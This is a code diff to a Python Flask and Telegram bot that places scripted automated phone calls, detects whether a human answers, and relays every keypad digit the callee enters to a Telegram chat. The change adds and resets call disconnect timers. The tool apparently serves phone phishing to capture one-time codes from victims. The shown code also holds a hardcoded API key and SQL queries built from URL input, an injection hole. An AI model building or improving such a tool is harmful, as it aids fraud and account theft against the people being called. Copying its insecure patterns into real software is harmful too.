@@ -47,6 +47,18 @@ apiKey2 = "57wbs19H2d20290A0292Ha92k3hdeinqunj"
 last_message_ids = {}
 user_timers = {}
 
+def start_disconnect_timer(userid):
+        timer = threading.Timer(35.0, partial(callhangup, userid))
+        user_timers[userid] = timer
+        timer.start()
+        print("Timer Started",userid)
+
+def reset_disconnect_timer(userid):
+        if userid in user_timers:
+            user_timers[userid].cancel()
+            print("Timer Reseted",userid)
+        start_disconnect_timer(userid)
+
 
 
 
@@ -849,7 +861,6 @@ def callhangup(chatid:int):
     c = db.cursor()
     c.execute(f"Select * from api_key where id=123")
     apidata= c.fetchone()
-    print(chatid)
     c.execute(f"Select * from call_data where chat_id={chatid}")
     custom_cont = c.fetchone()
     call_control  = custom_cont[1]
@@ -869,6 +880,9 @@ def callhangup(chatid:int):
 }
          resp = requests.post(urlht, json=data)
          print(resp.text)
+
+    if chatid in user_timers:
+            del user_timers[chatid]
     c.close()
 
 
@@ -1094,6 +1108,7 @@ def custom_confirm1(message):
         
 @app.route('/<script_id>/<chatid>/custom', methods=['POST'])
 def custom_prebuild_script_call(script_id,chatid):
+    global user_timers
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
     data = request.get_json()
@@ -1109,19 +1124,6 @@ def custom_prebuild_script_call(script_id,chatid):
     selected_voice = voices[7]
     call_cost = voices[11]
     no_space_voice = "".join(selected_voice.split())
-
-    def start_disconnect_timer(userid):
-        timer = threading.Timer(15.0, partial(callhangup, userid))
-
-        user_timers[userid] = timer
-        timer.start()
-        print("Timer Started",userid)
-
-    def reset_disconnect_timer(userid):
-        if userid in user_timers:
-            user_timers[userid].cancel()
-            print("Timer Reseted",userid)
-        start_disconnect_timer(userid)
 
 
   
@@ -1179,12 +1181,12 @@ def custom_prebuild_script_call(script_id,chatid):
 
     elif event == "amd.machine":
         bot.send_message(chatid,f"""*Machine found 🤖*""",parse_mode='markdown')
+        start_disconnect_timer(chatid)
 
     elif event == "amd.human":
         bot.send_message(chatid,f"""*Human found 👤*""",parse_mode='markdown')
         start_disconnect_timer(chatid)
         
-
 
     elif event == "dtmf.entered":
         data = request.get_json()
@@ -1305,6 +1307,7 @@ def confirm1(message):
         
 @app.route('/<service>/<chatid>/random', methods=['POST'])
 def prebuild_script_call(service,chatid):
+    global user_timers
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
     data = request.get_json()
@@ -1369,16 +1372,17 @@ def prebuild_script_call(service,chatid):
 
     elif event == "amd.machine":
         bot.send_message(chatid,f"""*Machine found 🤖*""",parse_mode='markdown')
-        
+        start_disconnect_timer(chatid)
 
     elif event == "amd.human":
         bot.send_message(chatid,f"""*Human found 👤*""",parse_mode='markdown')
+        start_disconnect_timer(chatid)
         
     elif event == "dtmf.entered":
         data = request.get_json()
         digit =  data['digit']
         bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')
-
+        reset_disconnect_timer(chatid)
 
     elif event == "dtmf.gathered":
         data = request.get_json()
@@ -1504,6 +1508,7 @@ def tcustom_confirm1(message):
         
 @app.route('/<script_id>/<chatid>/custom/texis', methods=['POST'])
 def t_custom_prebuild_script_call(script_id,chatid):
+    global user_timers
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
     data = request.get_json()
@@ -1536,6 +1541,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url1, json=data)
             bot.send_message(chatid,f"""*Call Answered 📞*""",parse_mode='markdown')
+            start_disconnect_timer(chatid)
         
 
     elif event == "hangup":
@@ -1568,7 +1574,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
         data = request.get_json()
         digit =  data['digit']
         bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')
-   
+        reset_disconnect_timer(chatid)
         
     elif event == "dtmf.completed":
         data = request.get_json()
@@ -1689,6 +1695,7 @@ def tconfirm1(message):
         
 @app.route('/<service>/<chatid>/random/texis', methods=['POST'])
 def tprebuild_script_call(service,chatid):
+    global user_timers
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
     data = request.get_json()
@@ -1715,6 +1722,7 @@ def tprebuild_script_call(service,chatid):
 }
         requests.post(url1, json=data)
         bot.send_message(chatid,f"""*Call Answerd 🗣️*""",parse_mode='markdown')
+        start_disconnect_timer(chatid)
     
     elif event == "hangup":
         try:
@@ -1748,7 +1756,7 @@ def tprebuild_script_call(service,chatid):
         data = request.get_json()
         digit =  data['digit']
         bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')
-
+        reset_disconnect_timer(chatid)
 
     elif event == "dtmf.completed":
         data = request.get_json()
